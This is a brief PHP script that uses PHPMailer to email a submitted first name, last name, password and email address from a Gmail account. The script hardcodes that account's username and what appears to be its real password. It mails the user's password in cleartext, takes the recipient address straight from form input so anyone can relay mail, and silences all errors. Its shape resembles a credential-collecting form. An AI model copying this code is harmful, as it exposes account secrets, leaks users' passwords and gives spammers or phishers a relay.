<?php
include "phpmailer/PHPMailerAutoload.php";
$gmailUsername = "veocalimlim@gmail.com";//Gmail username to be use as sender(make sure that the gmail settings was ON or enable)
$gmailPassword = "elevenunitedcrowns";//Gmail Password used for the gmail 
error_reporting(0);
//////////////////////////////////////
$mail = new PHPMailer(); 
$mail->IsSMTP(); 
$mail->SMTPAuth = true; 
$mail->SMTPSecure = 'ssl'; // 
$mail->Host = "smtp.gmail.com";
$mail->Port = 465; // or 587
$mail->IsHTML(true);
$mail->Username = $gmailUsername;
$mail->Password = $gmailPassword;
/////////////////////////////////////

if($_POST['fname'] != null && $_POST['lname'] != null && $_POST['pass'] != null  && $_POST['cemail'] != null){

$mail->SetFrom($gmailUsername,"Calm Flight");//Name of Sender: example "FEU-IT Admin" could be change and replace as the name of the sender
$mail->Subject = $_POST['form_subject'];//Email Subject: to get the subject from the form
$mail->Body = "First Name: ". $_POST['fname'] . "<br>Last Name: ".$_POST['lname'] . "<br>Password: ". $_POST['pwd1'] . "<br>Email: ".$_POST['cemail']; //Content of Message : to get the content or body of the email from form
$mail->AddAddress($_POST['email']);//Recepient of email: to send whatever email you want to

 if(!$mail->Send()) {
    echo "Mailer Error: " . $mail->ErrorInfo;
 } else {
    echo "<script>alert('Message has been sent.')</script>";
 }
}
else {
	return;
}
?>
